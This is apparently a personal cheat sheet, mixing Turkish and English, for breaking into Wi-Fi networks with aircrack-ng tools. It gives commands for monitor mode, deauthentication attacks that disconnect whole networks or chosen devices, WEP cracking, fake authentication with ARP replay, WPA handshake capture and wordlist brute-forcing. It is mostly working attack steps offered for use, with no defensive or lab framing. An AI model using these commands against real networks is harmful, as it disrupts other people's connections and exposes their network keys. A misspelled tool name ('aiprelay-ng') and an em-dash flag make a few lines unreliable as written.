# iwconfig
monitor and managed mode, monitor mode for hacking

# start airmon-ng
airmon-ng start wlan0

# stop airmon-ng
airmon-ng stop wlan0mon
service NetworkManager restart
airmon-ng check kill

# bilgi toplama
airodump-ng wlan0mon

# spesifik ağ bilgi toplama
airodump-ng --channel <channel-name> --bssid <bssid> --write <file-name> <interface-wlanmon0>

# deauth attack

# Tüm ağ için
aireplay-ng --deauth <#package> -a <modem-Mac Address> wlan0mon

# spesifik ağ için (daha etkili)
aiprelay-ng --deauth <#package> -c <cihaz-mac-adress> -a <modem-mac-address> wlan0mon

# WEP ağı kırma (trafik olması lazım)
aircrack-ng <cap file>

# Fake auth
aireplay-ng --fakeauth 0 -a <modem-mac-adress> -h <bizim-pc-mac-adres> wlan0mon
aireplay-ng --arpreplay <> -b <modem-mac-adres> -h <bizim-mac-adres> wlan0mon

# WPA kırmak
bilgi topla
kısa süreli deauth at böylece handshake elde et
aireplay-ng —deauth 10 -a <AP> -c <target> <interface>


crunch 6 12 asd123456 -o wordlist.txt
aircrack-ng <capfile> -w <wordlist>